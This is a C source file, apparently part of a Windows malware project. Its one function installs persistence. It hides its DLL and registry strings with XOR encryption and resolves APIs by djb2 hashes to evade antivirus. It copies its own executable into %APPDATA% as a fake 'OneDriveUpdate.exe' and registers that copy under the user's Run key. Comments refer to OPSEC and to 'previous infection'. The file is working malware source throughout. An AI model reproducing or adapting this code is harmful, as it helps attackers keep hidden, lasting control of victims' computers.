#include "config.h"
#include "persistence.h"
#include "evasion.h"
#include <string.h>

// used to cast generic API function pointer (FARPROC)
typedef LONG (WINAPI *pRegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LONG (WINAPI *pRegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LONG (WINAPI *pRegCloseKey)(HKEY hKey);

// --- new typedefs for self-copy logic
typedef DWORD (WINAPI *pGetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
typedef BOOL (WINAPI *pCopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);

bool install_persistence(const char* current_exe_path) {
    // load key runtime (in stack)
    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);

    char enc_advapi[] = { 0x3e, 0x17, 0x03, 0x11, 0x43, 0x1a, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
    char enc_RunPath[] = { 0x0c, 0x1c, 0x13, 0x04, 0x44, 0x12, 0x41, 0x06, 0x2e, 0x7e, 0x1d, 0x08, 0x41, 0x16, 0x2c, 0x30, 0x15, 0x01, 0x2c, 0x64, 0x1a, 0x5d, 0x07, 0x1d, 0x44, 0x07, 0x37, 0x70, 0x0c, 0x2d, 0x2d, 0x16, 0x1b, 0x04, 0x65, 0x16, 0x41, 0x10, 0x1b, 0x5c, 0x1a, 0x37, 0x61, 0x0c, 0x31, 0x5f };
    char enc_ValName[] = { 0x10, 0x1d, 0x10, 0x34, 0x41, 0x1a, 0x45, 0x06, 0x27, 0x43, 0x10, 0x0a, 0x47, 0x1c, 0x5f };
    
    // --- new encoded strings for self-copy
    char enc_AppData[] = { 0x1e, 0x23, 0x25, 0x34, 0x72, 0x27, 0x72, 0x63 };
    char enc_DestFile[] = { 0x03, 0x3c, 0x1b, 0x15, 0x77, 0x01, 0x5a, 0x15, 0x17, 0x66, 0x04, 0x0f, 0x52, 0x0d, 0x3a, 0x71, 0x16, 0x0d, 0x15, 0x33 };

    // API hashes
    // NOTE: calculate these using hasher.py
    DWORD hash_RegOpenKeyExA = 0x074A975C;   // djb2 for "RegOpenKeyExA"
    DWORD hash_RegSetValueExA = 0x345872EA;  // djb2 for "RegSetValueExA"
    DWORD hash_RegCloseKey = 0x736B3702;     // djb2 for "RegCloseKey"
    DWORD hash_GetEnvVarA = 0x87889701;      // djb2 for "GetEnvironmentVariableA"
    DWORD hash_CopyFileA = 0xAC2253C1;       // djb2 for "CopyFileA"

    // --- load DLL dynamically

    // advapi32.dll
    xor_crypt(enc_advapi, sizeof(enc_advapi), cypher_key, cypher_key_len);
    HMODULE hAdvapi = LoadLibraryA(enc_advapi);
    // OPSEC: recypher DLL name immediately
    xor_crypt(enc_advapi, sizeof(enc_advapi), cypher_key, cypher_key_len);

    // kernel32.dll
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
    // OPSEC: recypher DLL name immediately
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);

    if (!hAdvapi || !hKernel32) return false;

    // --- dynamic resolution via hashing

    pRegOpenKeyExA fnRegOpenKeyExA = (pRegOpenKeyExA) get_api_by_hash(hAdvapi, hash_RegOpenKeyExA);
    pRegSetValueExA fnRegSetValueExA = (pRegSetValueExA) get_api_by_hash(hAdvapi, hash_RegSetValueExA);
    pRegCloseKey fnRegCloseKey = (pRegCloseKey) get_api_by_hash(hAdvapi, hash_RegCloseKey);
    pGetEnvironmentVariableA fnGetEnvVarA = (pGetEnvironmentVariableA) get_api_by_hash(hKernel32, hash_GetEnvVarA);
    pCopyFileA fnCopyFileA = (pCopyFileA) get_api_by_hash(hKernel32, hash_CopyFileA);

    // if AV blocks a function -> return
    if (!fnRegOpenKeyExA || !fnRegSetValueExA || !fnRegCloseKey || !fnGetEnvVarA || !fnCopyFileA) return false;

    // --- self-copy logic

    char dest_path[MAX_PATH];
    
    // decrypt APPDATA string
    xor_crypt(enc_AppData, sizeof(enc_AppData), cypher_key, cypher_key_len);
    // get APPDATA path (ex. C:\Users\Username\AppData\Roaming)
    DWORD env_res = fnGetEnvVarA(enc_AppData, dest_path, MAX_PATH);
    // OPSEC: recypher
    xor_crypt(enc_AppData, sizeof(enc_AppData), cypher_key, cypher_key_len);

    if (env_res > 0 && env_res < MAX_PATH) {
        xor_crypt(enc_DestFile, sizeof(enc_DestFile), cypher_key, cypher_key_len);
        // append fake filename to APPDATA path
        strcat(dest_path, enc_DestFile);
        xor_crypt(enc_DestFile, sizeof(enc_DestFile), cypher_key, cypher_key_len);

        // copy current exe to %APPDATA%\OneDriveUpdate.exe
        // NOTE: FALSE = overwrite file if it already exists from a previous infection
        fnCopyFileA(current_exe_path, dest_path, FALSE);
    } else {
        // fallback: if APPDATA fails, use current path for registry
        strcpy(dest_path, current_exe_path);
    }

    // --- registry modification
    
    HKEY hKey;
    
    xor_crypt(enc_RunPath, sizeof(enc_RunPath), cypher_key, cypher_key_len);
    xor_crypt(enc_ValName, sizeof(enc_ValName), cypher_key, cypher_key_len);
    
    // open key to write registry
    LONG open_res = fnRegOpenKeyExA(HKEY_CURRENT_USER, enc_RunPath, 0, KEY_WRITE, &hKey);
    
    if (open_res == ERROR_SUCCESS) {
        // NOTE: writing dest_path (the copied file) instead of current_exe_path
        fnRegSetValueExA(hKey, enc_ValName, 0, REG_SZ, (const BYTE*)dest_path, strlen(dest_path) + 1);
        
        // close registry handle
        fnRegCloseKey(hKey);
        
        // OPSEC: encode strings in RAM
        xor_crypt(enc_RunPath, sizeof(enc_RunPath), cypher_key, cypher_key_len);
        xor_crypt(enc_ValName, sizeof(enc_ValName), cypher_key, cypher_key_len);
        
        return true;
    }

    // OPSEC: encode also if failure occurs
    xor_crypt(enc_RunPath, sizeof(enc_RunPath), cypher_key, cypher_key_len);
    xor_crypt(enc_ValName, sizeof(enc_ValName), cypher_key, cypher_key_len);
    
    return false;
}
